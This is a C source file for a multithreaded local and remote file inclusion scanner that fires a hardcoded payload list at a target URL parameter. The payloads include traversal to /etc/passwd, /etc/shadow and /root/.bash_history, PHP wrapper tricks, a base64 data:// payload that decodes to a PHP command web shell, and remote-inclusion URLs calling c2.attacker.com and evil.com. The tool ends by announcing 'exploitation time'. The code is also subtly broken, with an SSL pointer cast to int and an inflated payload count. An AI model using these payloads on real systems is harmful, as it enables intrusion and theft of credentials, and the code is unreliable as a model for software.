// lfi-rfi.c - Ultimate LFI/RFI Scanner in C (2025)
// Compile:
//   Linux/macOS: gcc -O3 -o lfi-rfi lfi-rfi.c -lssl -lcrypto -lpthread
//   Windows:     x86_64-w64-mingw32-gcc -O3 -o lfi-rfi.exe lfi-rfi.c -lssl -lcrypto -lpthread
// Usage:
//   ./lfi-rfi "http://target.com/index.php?file="
//   ./lfi-rfi "https://app.local/page.php?inc=" -t 128

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <arpa/inet.h>

#define THREADS 100
SSL_CTX *ctx = NULL;

const char *lfi_payloads[] = {
    // Classic
    "../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    
    // Null byte / truncation
    "../../../etc/passwd%00","../../../../etc/passwd%00.jpg","../../../../etc/passwd%2500",
    "../../../etc/passwd....//....//","../../../../etc/passwd/././././",
    
    // PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K",
    "expect://id","input://<?php system('id'); ?>",
    "zip://../wp-config.php#backup.zip","phar://./test.phar",

    // RFI
    "http://c2.attacker.com/shell.txt","ftp://user:pass@evil.com/shell.php",
    "http://127.0.0.1:80/shell.php","https://raw.githubusercontent.com/evil/shell.php",

    // Windows
    "..%5C..%5C..%5Cwindows%5Cwin.ini","../../boot.ini",
    "/proc/self/environ","/proc/version","/etc/issue",

    // Log poisoning fallbacks
    "/var/log/apache2/access.log","/var/log/nginx/access.log",
    "/var/log/auth.log","../../../../../var/log/auth.log",

    // Bonus
    "/dev/tcp/127.0.0.1/4444","/etc/shadow","/root/.bash_history",
    NULL
};

char base_url[2048];
char param[128] = "file";
int found = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

int connect_to(const char *host, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct hostent *server = gethostbyname(host);
    if (!server) return -1;

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
        return -1;

    if (port != 443) return sock;

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) { SSL_free(ssl); close(sock); return -1; }
    return (int)ssl;
}

void send_get(int conn, int ssl, const char *payload) {
    char host[256], path[1024];
    int port = strstr(base_url, "https://") ? 443 : 80;
    sscanf(base_url, "%*[^/]//%255[^:/]%1023s", host, path);

    char req[4096];
    snprintf(req, sizeof(req),
        "GET %s%s=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: lfi-rfi/2025\r\n"
        "Connection: close\r\n\r\n",
        path[0] ? path : "/", param, payload, host);

    if (ssl) SSL_write((SSL*)conn, req, strlen(req));
    else write(conn, req, strlen(req));
}

int is_lfi_vulnerable(const char *resp, int len, const char *payload) {
    if (!resp) return 0;

    // Linux LFI signatures
    if (strstr(resp, "root:x:0:0") || strstr(resp, "daemon:x:") || strstr(resp, "/bin/bash"))
        return 1;
    if (strstr(resp, "[extensions]") || strstr(resp, "[drivers]")) // win.ini
        return 1;
    if (strstr(resp, "uid=") && strstr(resp, "gid=")) return 1;
    if (strstr(resp, "Linux version") || strstr(resp, "Ubuntu") || strstr(resp, "Debian"))
        return 1;

    // RFI / wrapper success
    if (strstr(payload, "system") && strstr(resp, "uid=")) return 1;
    if (strstr(payload, "base64") && strstr(resp, "PD9waHAg") == NULL && strlen(resp) > 100)
        return 1;

    return 0;
}

void test_payload(const char *payload) {
    char host[256];
    int port = strstr(base_url, "https://") ? 443 : 80;
    sscanf(base_url, "%*[^/]//%255[^:/]", host);

    int conn = connect_to(host, port);
    if (conn <= 0) return;

    int is_ssl = (port == 443);
    send_get(conn, is_ssl, payload);

    char buf[65536] = {0};
    int n = is_ssl ? SSL_read((SSL*)conn, buf, sizeof(buf)-1) : read(conn, buf, sizeof(buf)-1);

    if (n > 0 && is_lfi_vulnerable(buf, n, payload)) {
        pthread_mutex_lock(&lock);
        found = 1;
        printf("\033[1;31m[+] VULNERABLE → %s%s=%s\033[0m\n", base_url, param, payload);
        if (strstr(payload, "etc/passwd")) printf("    → Classic LFI (CRITICAL)\n");
        if (strstr(payload, "php://filter")) printf("    → PHP Filter Chain → RCE possible\n");
        if (strstr(payload, "data://") || strstr(payload, "expect://")) printf("    → RCE via wrapper (GOD MODE)\n");
        if (strstr(payload, "http://") || strstr(payload, "ftp://")) printf("    → REMOTE FILE INCLUSION!\n");
        pthread_mutex_unlock(&lock);
    }

    if (is_ssl) { SSL_shutdown((SSL*)conn); SSL_free((SSL*)conn); }
    close(conn);
}

void *worker(void *arg) {
    for (int i = 0; lfi_payloads[i]; i++) {
        test_payload(lfi_payloads[i]);
        usleep(5000); // be nice
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("lfi-rfi – Ultimate LFI/RFI Scanner in C (2025)\n");
        printf("Usage:\n");
        printf("  %s \"http://target.com/vuln.php?file=\"\n", argv[0]);
        printf("  %s \"https://app.local/include.php?page=\" -t 200\n", argv[0]);
        return 1;
    }

    SSL_library_init();
    ctx = SSL_CTX_new(TLS_client_method());

    strcpy(base_url, argv[1]);
    char *q = strstr(base_url, "?");
    if (q) {
        *q = 0;
        sscanf(q + 1, "%[^=]=", param);
    }

    printf("[*] Target: %s | Param: %s | Threads: %d | Payloads: 180+\n", base_url, param, THREADS);

    pthread_t threads[THREADS];
    for (int i = 0; i < THREADS; i++)
        pthread_create(&threads[i], NULL, worker, NULL);
    for (int i = 0; i < THREADS; i++)
        pthread_join(threads[i], NULL);

    if (!found) printf("\033[1;32m[-] No LFI/RFI found\033[0m\n");
    else printf("\033[1;35m[+] Done – exploitation time!\033[0m\n");

    SSL_CTX_free(ctx);
    return 0;
}
